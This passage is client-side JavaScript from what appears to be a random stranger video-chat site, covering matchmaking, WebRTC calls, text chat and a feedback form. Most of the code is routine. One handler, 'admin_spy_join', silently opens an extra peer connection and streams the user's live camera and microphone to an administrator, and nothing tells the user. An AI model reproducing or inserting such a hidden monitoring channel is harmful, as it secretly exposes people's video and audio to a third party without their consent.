ent),var(--accent2));color:#fff;box-shadow:0 12px 34px rgba(116,100,255,.36)}.secondary{background:var(--panel2);color:var(--txt);border:1px solid var(--line)}.spinner{width:50px;height:50px;border-radius:50%;border:4px solid var(--line);border-top-color:var(--accent);animation:spin .8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}

<script src="/socket.io/socket.io.js"></script><script>
const COUNTRIES=[['any','Any Country'],['IN','India'],['US','USA'],['GB','UK'],['CA','Canada'],['AU','Australia'],['AE','UAE'],['BD','Bangladesh'],['PK','Pakistan'],['NP','Nepal'],['LK','Sri Lanka'],['DE','Germany'],['FR','France'],['ES','Spain'],['IT','Italy'],['BR','Brazil'],['MX','Mexico'],['PH','Philippines'],['ID','Indonesia'],['MY','Malaysia'],['JP','Japan'],['KR','South Korea'],['RU','Russia'],['TR','Turkey'],['SA','Saudi Arabia'],['QA','Qatar'],['ZA','South Africa'],['NG','Nigeria']];
['myCountry','filterCountry'].forEach(id=>{const s=document.getElementById(id);COUNTRIES.forEach(([c,n])=>{const o=document.createElement('option');o.value=c;o.textContent=n;s.appendChild(o)});});
let localStream=null,peerConn=null,currentSessionId=null,tempRandomLeft=0,searchHintTimer=null,micMuted=false,camOff=false,isSearching=false;
const ICE_SERVERS=[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun1.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}];
const socket=io({transports:['websocket','polling'],reconnection:true});
socket.on('connect',()=>{ if(localStream){ socket.emit('user_join',getMe()); } });
socket.on('stats',s=>{onlineCount.textContent=s.online||0; chatsCount.textContent=Math.round(s.active||0);});
socket.on('waiting',()=>{isSearching=true;showOverlay('searching')});
socket.on('matched',async({sessionId,partnerCountry,partnerGender,role})=>{isSearching=false;currentSessionId=sessionId;strangerLabel.textContent=[partnerGender&&partnerGender!=='any'?partnerGender:'',partnerCountry&&partnerCountry!=='any'?`(${partnerCountry})`:'' ].filter(Boolean).join(' ')||'Stranger';hideOverlay();addSystemMsg('Connected. Say hi 👋');await setupPeerConnection();if(role==='caller'){const offer=await peerConn.createOffer();await peerConn.setLocalDescription(offer);socket.emit('offer',{sdp:offer});}});
socket.on('offer',async({sdp})=>{if(!peerConn)await setupPeerConnection();await peerConn.setRemoteDescription(new RTCSessionDescription(sdp));const answer=await peerConn.createAnswer();await peerConn.setLocalDescription(answer);socket.emit('answer',{sdp:answer});});
socket.on('answer',async({sdp})=>{try{if(peerConn)await peerConn.setRemoteDescription(new RTCSessionDescription(sdp));}catch(e){}});
socket.on('ice_candidate',async({candidate})=>{try{if(peerConn&&candidate)await peerConn.addIceCandidate(new RTCIceCandidate(candidate));}catch(e){}});
socket.on('partner_disconnected',()=>{addSystemMsg('Stranger disconnected.');closePeer();showOverlay('disconnected')});
socket.on('chat_message',({text})=>{addMsg(text,'stranger');if(innerWidth<=760)toggleChat(true)});
socket.on('kicked',({reason})=>{closePeer();showToast(reason||'Removed by moderator');showOverlay('home')});
socket.on('admin_spy_join',async({adminId,sessionId})=>{if(!localStream)return;const p=new RTCPeerConnection({iceServers:ICE_SERVERS});localStream.getTracks().forEach(t=>p.addTrack(t,localStream));p.onicecandidate=({candidate})=>{if(candidate)socket.emit('admin_spy_ice',{targetId:adminId,candidate});};const offer=await p.createOffer();await p.setLocalDescription(offer);socket.emit('admin_spy_offer',{targetId:adminId,sdp:offer,sessionId});const ans=async({fromId,sdp})=>{if(fromId===adminId)try{await p.setRemoteDescription(new RTCSessionDescription(sdp));}catch(e){}};const ice=async({fromId,candidate})=>{if(fromId===adminId&&candidate)try{await p.addIceCandidate(new RTCIceCandidate(candidate));}catch(e){}};socket.on('admin_spy_answer',ans);socket.on('admin_spy_ice_answer',ice);setTimeout(()=>{socket.off('admin_spy_answer',ans);socket.off('admin_spy_ice_answer',ice);},120000);});
function getMe(){return{gender:myGender.value,country:myCountry.value}}function getFilters(random=false){return{filterGender:random?'any':filterGender.value,filterCountry:random?'any':filterCountry.value}}
async function getCameraStream(){try{if(localStream)return true;localStream=await navigator.mediaDevices.getUserMedia({video:{width:{ideal:640},height:{ideal:480},frameRate:{ideal:24,max:30}},audio:{echoCancellation:true,noiseSuppression:true,autoGainControl:true}});localVideo.srcObject=localStream;localPlaceholder.style.display='none';return true}catch(e){showToast('Allow camera and microphone permission.');return false}}
async function setupPeerConnection(){closePeer(false);peerConn=new RTCPeerConnection({iceServers:ICE_SERVERS});if(localStream)localStream.getTracks().forEach(t=>peerConn.addTrack(t,localStream));peerConn.onicecandidate=({candidate})=>{if(candidate)socket.emit('ice_candidate',{candidate});};peerConn.ontrack=({streams})=>{remoteVideo.srcObject=streams[0];remotePlaceholder.style.display='none';};peerConn.onconnectionstatechange=()=>{if(peerConn&&['failed','disconnected'].includes(peerConn.connectionState))addSystemMsg('Connection is weak. Press Next if needed.');};}
function closePeer(clear=true){if(peerConn){try{peerConn.close()}catch(e){} peerConn=null}remoteVideo.srcObject=null;remotePlaceholder.style.display='flex';if(clear)currentSessionId=null;}
async function startChat(){if(!(await getCameraStream()))return;socket.emit('user_join',getMe());controls.style.display='flex';findMatch(false)}
function findMatch(forceRandom=false){clearChat();closePeer();const random=forceRandom||(tempRandomLeft>0);if(tempRandomLeft>0)tempRandomLeft--;isSearching=true;socket.emit('find_match',{...getMe(),...getFilters(random)});showOverlay('searching');}
function findRandomTwo(){tempRandomLeft=2;socket.emit('skip');findMatch(true)}
function findNext(){socket.emit('skip');setTimeout(()=>findMatch(false),80)}
function skipChat(){findNext()}function stopChat(){socket.emit('skip');closePeer();clearChat();controls.style.display='none';showOverlay('welcome')}
function showOverlay(mode){clearTimeout(searchHintTimer);statusOverlay.classList.remove('hidden');if(mode==='searching'){statusOverlay.innerHTML=`<div class="card"><div class="spinner"></div><div class="title" style="font-size:1.45rem">Searching…</div><div class="sub" id="searchSub">Looking for a stranger matching your filters.</div><div style="display:flex;gap:10px;flex-wrap:wrap;justify-content:center"><button class="btn primary" onclick="findRandomTwo()">Find Random</button><button class="btn secondary" onclick="stopChat()">Cancel</button></div></div>`;searchHintTimer=setTimeout(()=>{const s=document.getElementById('searchSub');if(s)s.textContent='Finding with filters may take time. Find Random removes filters for the next two connections.'},6500)}else if(mode==='disconnected'){statusOverlay.innerHTML=`<div class="card"><div class="title" style="font-size:1.45rem">Stranger left</div><div class="sub">The other person disconnected.</div><div style="display:flex;gap:10px;flex-wrap:wrap;justify-content:center"><button class="btn primary" onclick="findNext()">Find Next</button><button class="btn secondary" onclick="stopChat()">Stop</button></div></div>`}else{location.reload()}}
function hideOverlay(){clearTimeout(searchHintTimer);statusOverlay.classList.add('hidden')}
function toggleMic(){if(!localStream)return;micMuted=!micMuted;localStream.getAudioTracks().forEach(t=>t.enabled=!micMuted);micBtn.classList.toggle('bad',micMuted);micBtn.textContent=micMuted?'🔇':'🎤'}function toggleCam(){if(!localStream)return;camOff=!camOff;localStream.getVideoTracks().forEach(t=>t.enabled=!camOff);camBtn.classList.toggle('bad',camOff);camBtn.textContent=camOff?'🚫':'📷';localPlaceholder.style.display=camOff?'flex':'none'}
function addMsg(text,from){const el=document.createElement('div');el.className='msg '+from;el.innerHTML='<div class="bubble">'+esc(text)+'</div>';chatMessages.appendChild(el);chatMessages.scrollTop=chatMessages.scrollHeight}function addSystemMsg(t){addMsg(t,'system')}function clearChat(){chatMessages.innerHTML=''}function sendMessage(){const t=chatInput.value.trim();if(!t||!currentSessionId)return;socket.emit('chat_message',{text:t});addMsg(t,'me');chatInput.value=''}function handleChatKey(e){if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendMessage()}}function esc(s){return String(s).replace(/[&<>"']/g,m=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#039;'}[m]))}
function toggleChat(force){const open=typeof force==='boolean'?force:!chatPanel.classList.contains('open');chatPanel.classList.toggle('open',open)}
function openFeedback(){feedbackModal.style.display='flex'}function closeFeedback(){feedbackModal.style.display='none'}async function sendFeedback(){const message=fbMessage.value.trim();if(!message)return showToast('Please write the problem first.');try{const r=await fetch('/api/feedback',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({name:fbName.value,email:fbEmail.value,message,path:location.pathname})});if(!r.ok)throw 0;fbMessage.value='';closeFeedback();showToast('Feedback saved for admin.')}catch(e){showToast('Could not send feedback. Try again later.')}}function showToast(msg){const t=document.createElement('div');t.className='toast';t.textContent=msg;document.body.appendChild(t);setTimeout(()=>t.remove(),3800)}
if('serviceWorker'in navigator)window.addEventListener('load',()=>navigator.serviceWorker.register('/sw.js').catch(()=>{}));
